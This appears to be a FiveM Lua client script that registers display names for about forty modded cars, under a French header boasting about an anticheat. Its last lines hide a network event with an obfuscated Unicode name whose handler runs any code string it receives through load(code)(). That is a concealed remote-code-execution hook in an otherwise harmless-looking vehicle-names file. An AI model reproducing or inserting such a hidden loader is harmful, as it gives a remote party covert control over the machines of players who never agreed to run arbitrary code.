-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

Citizen.CreateThread(function()
	AddTextEntry('bmci', 'BMW M5')
	AddTextEntry('c63', 'Mercedes C63 AMG')
	AddTextEntry('cb500f', 'Honda CB500F 2018')
	AddTextEntry('cls53', 'Mercedes CLS53 AMG')
	AddTextEntry('dodgeEMS', 'Dodge EMS')
	AddTextEntry('fct', 'Ferrari Californiat 2017')
	AddTextEntry('macla', 'Mercedes Class A')
	AddTextEntry('mlbrabus', 'Mercedes Brabus')
	AddTextEntry('rs3', 'Audi Rs3')
	AddTextEntry('tmax', 'Yamaha T-Max')
	AddTextEntry('urus2018', 'Lamborghini Urus 2018')
	AddTextEntry('911turbos', '911 Turbo')
	AddTextEntry('amggtrr20', 'Amg GTR20')
	AddTextEntry('audiq8', 'Audi Q8')
	AddTextEntry('audsq517', 'Audi SQ5')
	AddTextEntry('bmwm8', 'BMW M8')
	AddTextEntry('e63amg', 'E63 AMG')
	AddTextEntry('fz07', 'Yamaha fz-07')
	AddTextEntry('g63pp', 'G63PP')
	AddTextEntry('g65amg', 'G65 AMG')
	AddTextEntry('f620', 'F620 ')
	AddTextEntry('m4', 'BMW M4')
	AddTextEntry('kx450f', 'KX450F')
	AddTextEntry('rs7c8wb', 'Audi RS7')
	AddTextEntry('rs5', 'Audi RS5')
	AddTextEntry('p1', 'McLaren P1')
	AddTextEntry('panamera17turbo', 'Panamera Turbo S')
	AddTextEntry('mlbrabus', 'Brabus G65')
	AddTextEntry('lp670sv', 'LAMBORGHINI MURCIELAGO')
	AddTextEntry('yzfsm', '125 YZ-SM')
	AddTextEntry('italia458', 'Ferrari 458 Italia')
	AddTextEntry('rmodcharger69', 'Dodge Charger 69')
	AddTextEntry('bmwm4', 'BMW M4')
	AddTextEntry('rmodbolide', 'Bolide')
	AddTextEntry('rmodbugatti', 'Bugatti')
	AddTextEntry('rmodcamaro', 'Camaro')
	AddTextEntry('rmodf12tdf', 'F12 TDF')
	AddTextEntry('rmodsianr', 'Lambo Sianr')
	AddTextEntry('2020RS6', 'RS6')
	AddTextEntry('tmaxDX', 'TMAX DX')
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)